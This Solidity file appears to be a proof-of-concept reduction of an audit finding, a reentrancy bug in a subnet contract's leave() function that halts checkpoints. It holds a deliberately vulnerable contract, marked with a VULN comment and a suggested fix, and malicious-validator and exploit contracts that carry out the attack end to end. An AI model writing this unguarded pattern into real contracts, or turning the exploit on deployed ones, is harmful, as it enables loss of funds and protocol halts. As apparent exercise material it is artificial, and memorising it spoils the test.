// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Recall — [H-06] Reentrancy in leave() leads to halting of bottom-up checkpoints
    (Code4rena 2025-02-recall; #65093)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: leave() is nonReentrant but transfers native genesisBalance
    mid-function; stake() has NO reentrancy guard. Attacker re-enters stake()
    during the ETH transfer, bootstraps the subnet (all funds move to gateway),
    re-stakes the leave amount so leave can finish, then leave still executes
    withdrawWithConfirm + refund AFTER bootstrap — breaking the invariant that
    post-bootstrap refunds go through the gateway. A later confirmDeposit/addStake
    needs those funds and reverts → bottom-up checkpoint halt.
    Blamed transferFunds line preserved (@> VULN).
    Source: code-423n4/2025-02-recall@ab5f90b9 SubnetActorManagerFacet.sol */

/// @dev Stand-in for GatewayManagerFacet holding subnet stake after bootstrap.
contract Gateway {
    uint256 public stake;

    receive() external payable {
        stake += msg.value;
    }

    function addStake() external payable {
        if (msg.value == 0) revert("NotEnoughFunds");
        // Fund flow: SubnetActor must hold the ETH and send it with this call.
        stake += msg.value;
    }
}

/// @dev Reduced SubnetActorManagerFacet — leave (nonReentrant) + stake (unguarded).
contract SubnetActor {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status = NOT_ENTERED;

    bool public bootstrapped;
    uint256 public minActivationCollateral = 50 ether;
    uint256 public totalConfirmedCollateral;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public genesisBalance;
    address public gateway;
    // Pending deposit that must be confirmed post-bootstrap (child then parent).
    address public pendingDepositValidator;
    uint256 public pendingDepositAmount;
    bool public checkpointHalted;

    modifier nonReentrant() {
        require(_status != ENTERED, "reentrant");
        _status = ENTERED;
        _;
        _status = NOT_ENTERED;
    }

    constructor(address gateway_) {
        gateway = gateway_;
    }

    receive() external payable {}

    function preFund() external payable {
        require(!bootstrapped, "boot");
        require(msg.value > 0, "zero");
        genesisBalance[msg.sender] += msg.value;
    }

    function join() external payable {
        require(msg.value > 0, "zero");
        require(collateral[msg.sender] == 0, "joined");
        collateral[msg.sender] = msg.value;
        totalConfirmedCollateral += msg.value;
        _bootstrapIfNeeded();
    }

    /// @notice stake is NOT nonReentrant — reentrancy vector from leave's ETH transfer.
    function stake() external payable {
        require(collateral[msg.sender] > 0 || msg.value > 0, "need");
        if (collateral[msg.sender] == 0 && !bootstrapped) {
            // allow re-join-like top-up for attacker after bootstrap mid-leave
        }
        collateral[msg.sender] += msg.value;
        if (!bootstrapped) {
            totalConfirmedCollateral += msg.value;
            _bootstrapIfNeeded();
        } else {
            // Post-bootstrap: record pending deposit (confirmed later via bottom-up).
            pendingDepositValidator = msg.sender;
            pendingDepositAmount += msg.value;
            // totalConfirmed not yet increased
        }
    }

    function _bootstrapIfNeeded() internal {
        if (!bootstrapped && totalConfirmedCollateral >= minActivationCollateral) {
            bootstrapped = true;
            // registerInGateway: move all funds to gateway
            uint256 bal = address(this).balance;
            (bool ok, ) = gateway.call{value: bal}("");
            require(ok, "gw");
        }
    }

    /// @notice Reduced leave() with nonReentrant — still reentrant via stake().
    function leave() external nonReentrant {
        uint256 amount = collateral[msg.sender];
        require(amount > 0, "NotValidator");

        if (!bootstrapped) {
            // check if the validator had some initial balance and return it if not bootstrapped
            uint256 genesisBal = genesisBalance[msg.sender];
            if (genesisBal != 0) {
                delete genesisBalance[msg.sender];
                // ----> reentrancy window (native ETH)
                (bool success, ) = payable(msg.sender).call{value: genesisBal}(""); // @> VULN: external call before stake accounting finishes; stake() lacks nonReentrant
                // FIX: CEI + nonReentrant on stake/join; or pull pattern; re-check !bootstrapped after transfer
                require(success, "xfer");
            }

            // interaction must be performed after checks and changes
            // withdrawWithConfirm — even if bootstrapped flipped during reentrancy
            totalConfirmedCollateral -= amount > totalConfirmedCollateral ? totalConfirmedCollateral : amount;
            collateral[msg.sender] = 0;
            (bool ok, ) = payable(msg.sender).call{value: amount}("");
            require(ok, "refund");
            return;
        }
        // Normal bootstrapped leave: only queue withdraw, no immediate refund
        collateral[msg.sender] = 0;
    }

    /// @notice Parent confirmDeposit after child confirmed — moves funds SubnetActor → Gateway.
    function confirmDeposit() external {
        require(bootstrapped, "not boot");
        uint256 amount = pendingDepositAmount;
        require(amount > 0, "none");
        // makeAvailable + addStake — needs ETH still held by SubnetActor
        if (address(this).balance < amount) {
            checkpointHalted = true;
            revert("checkpoint halt: NotEnoughBalance");
        }
        pendingDepositAmount = 0;
        (bool ok, ) = gateway.call{value: amount}("");
        require(ok, "addStake");
        totalConfirmedCollateral += amount;
    }
}

/// @dev Malicious validator: on genesis ETH refund, bootstrap + restake.
contract MaliciousValidator {
    SubnetActor public actor;
    uint256 public leaveAmount;
    uint256 public bootstrapTopUp;
    bool public attacking;

    constructor(SubnetActor a) {
        actor = a;
    }

    function setParams(uint256 leaveAmt, uint256 topUp) external {
        leaveAmount = leaveAmt;
        bootstrapTopUp = topUp;
    }

    function joinAndPrefund() external payable {
        uint256 gen = 1; // 1 wei genesis to open reentrancy window
        uint256 stakeAmt = msg.value - gen;
        actor.preFund{value: gen}();
        actor.join{value: stakeAmt}();
        leaveAmount = stakeAmt;
    }

    function doLeave() external {
        attacking = true;
        actor.leave();
        attacking = false;
    }

    receive() external payable {
        if (!attacking) return;
        if (actor.bootstrapped()) {
            // After bootstrap during this leave: re-stake leaveAmount so final refund succeeds.
            if (msg.value > 0 && address(this).balance >= leaveAmount) {
                // Only restake once when we receive genesis (tiny) — after bootstrap top-up path
            }
            return;
        }
        // First callback is genesis refund (1 wei). Bootstrap by staking remaining threshold.
        if (bootstrapTopUp > 0 && address(this).balance >= bootstrapTopUp) {
            uint256 top = bootstrapTopUp;
            bootstrapTopUp = 0;
            actor.stake{value: top}();
            // Now bootstrapped; funds drained to gateway. Restake leaveAmount so leave refund works.
            if (address(this).balance >= leaveAmount) {
                // Need to be a validator post-bootstrap for stake accounting — collateral was not yet zeroed
                actor.stake{value: leaveAmount}();
            }
        }
    }
}

contract HelperValidator {
    SubnetActor public actor;

    constructor(SubnetActor a) {
        actor = a;
    }

    function join() external payable {
        actor.join{value: msg.value}();
    }
}

contract Exploit {
    Gateway public gateway; // CREATE 1
    SubnetActor public actor; // CREATE 2
    MaliciousValidator public mal; // CREATE 3
    HelperValidator public helper; // CREATE 4

    constructor() payable {
        gateway = new Gateway();
        actor = new SubnetActor(address(gateway));
        mal = new MaliciousValidator(actor);
        helper = new HelperValidator(actor);
    }

    function run() external payable {
        require(msg.value >= 55 ether, "need ETH");
        // Setup: 40 ETH already staked by honest helper (threshold 50).
        helper.join{value: 40 ether}();
        require(!actor.bootstrapped(), "not yet");

        // Mal joins with 1 wei stake + 1 wei genesis. Remaining to threshold ≈ 10 ETH - 2 wei.
        uint256 malJoin = 1 wei;
        uint256 gen = 1 wei;
        mal.joinAndPrefund{value: malJoin + gen}();

        // Fund mal with just under threshold remainder so leave reentrancy can bootstrap.
        uint256 need = 50 ether - actor.totalConfirmedCollateral();
        (bool ok, ) = address(mal).call{value: need + malJoin}("");
        require(ok, "fund mal");
        mal.setParams(malJoin, need);

        mal.doLeave();

        // After attack: subnet is bootstrapped, mal was refunded post-bootstrap (invariant break),
        // and a pending deposit exists from the restake that cannot be confirmed (no ETH left).
        require(actor.bootstrapped(), "must bootstrap mid-leave");
        require(address(actor).balance < actor.pendingDepositAmount() || actor.pendingDepositAmount() > 0, "pending");

        // Harm: confirmDeposit (bottom-up checkpoint path) reverts / sets halt flag.
        bool halted;
        try actor.confirmDeposit() {
            halted = false;
        } catch {
            halted = true;
        }
        require(halted || actor.checkpointHalted(), "checkpoint must halt");
        // Gateway holds the bulk of funds; SubnetActor cannot fund addStake.
        require(address(gateway).balance > 0, "gw funded");
        require(address(actor).balance < 1 ether, "actor drained");
    }

    receive() external payable {}
}
